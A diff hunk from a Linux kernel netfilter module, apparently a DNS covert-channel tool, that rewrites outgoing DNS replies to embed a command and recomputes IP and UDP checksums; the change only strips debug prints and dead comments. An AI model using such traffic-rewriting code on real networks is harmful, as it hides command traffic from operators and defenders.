@@ -681,27 +681,19 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 			orig_dns_data = kmalloc(sizeof(unsigned char)*payload_len,GFP_DMA);
 			skb_copy_bits(skb,skb->len - payload_len,orig_dns_data,payload_len); // copy data from skb
 			/* new skb */
-			printk(KERN_INFO "SKB DATA LEN %d",payload_len);
 			new_dns_size = manipulate_dns_reply(orig_dns_data,command,new_dns_data,payload_len);
 			memcpy(data,new_dns_data,new_dns_size);
 			skb->len = skb->len - (payload_len) + new_dns_size;
-			printk(KERN_INFO "2new dns size: %d ",new_dns_size);
 			udph->len=htons(new_dns_size+8);
-			printk(KERN_INFO" ip tot %d payload %d new dns %d",ntohs(iph->tot_len), payload_len , new_dns_size);
 			iph->tot_len = htons(ntohs(iph->tot_len) - payload_len + new_dns_size);
 			/* recalculate checksums */
 			iph->check = 0;
 	                ip_send_check (iph);
 			udph->check = 0;
-//	               	offset = skb_transport_offset(skb);
 			skb->ip_summed = CHECKSUM_PARTIAL;
 			offset = skb_transport_offset(skb);
 	                udplen = skb->len - offset;
-//			udplen = skb->len - (iph->ihl<<2);
 			udph->check = ~csum_tcpudp_magic(iph->saddr, iph->daddr, udplen, IPPROTO_UDP, 0);
-//			udph->check = csum_tcpudp_magic(iph->saddr, iph->daddr, udplen, IPPROTO_UDP, skb_checksum(skb, 0, udplen, 0));
-//                        udph->check = csum_tcpudp_magic((iph->saddr), (iph->daddr), udplen, iph->protocol, csum_partial((char*)udph, udplen,0));
-//
 			/* remove the command */
 			remove_command(iph->daddr);
 		}
